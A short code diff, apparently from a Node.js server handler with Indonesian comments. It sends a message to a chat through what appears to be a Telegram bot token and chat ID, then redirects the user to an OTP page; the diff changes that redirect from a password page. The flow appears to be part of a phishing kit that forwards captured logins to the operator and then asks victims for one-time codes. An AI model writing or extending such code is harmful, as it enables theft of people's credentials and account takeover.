@@ -71,6 +71,6 @@ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' })}
     await sendMessage(botToken, chatId, message);
 
     // Redirect user ke halaman OTP
-    res.writeHead(302, { Location: '/Password/' });
+    res.writeHead(302, { Location: '/otp/' });
     res.end();
 };
